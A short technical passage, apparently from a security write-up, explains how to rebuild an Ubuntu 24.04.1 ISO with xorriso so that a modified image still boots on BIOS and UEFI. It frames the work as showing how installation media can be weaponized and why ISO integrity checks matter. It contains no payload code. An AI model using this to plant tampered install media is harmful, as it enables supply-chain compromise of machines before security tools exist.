On Ubuntu 24.04.1, the ISO uses GRUB2 for legacy BIOS boot and an appended EFI partition for UEFI boot, so the rebuild must use `xorriso` with the exact El Torito and isohybrid arguments reported by `-report_el_torito as_mkisofs`, including the `--grub2-mbr` source and the `-append_partition 2` byte range and GUID. A simple `mkisofs` command produces an ISO that fails to boot on UEFI. This work demonstrates how installation media can be weaponized at the deployment stage, before any endpoint security is in place, and why verifying the integrity of installation ISOs matters on modern, UEFI-booting machines as much as on legacy systems.
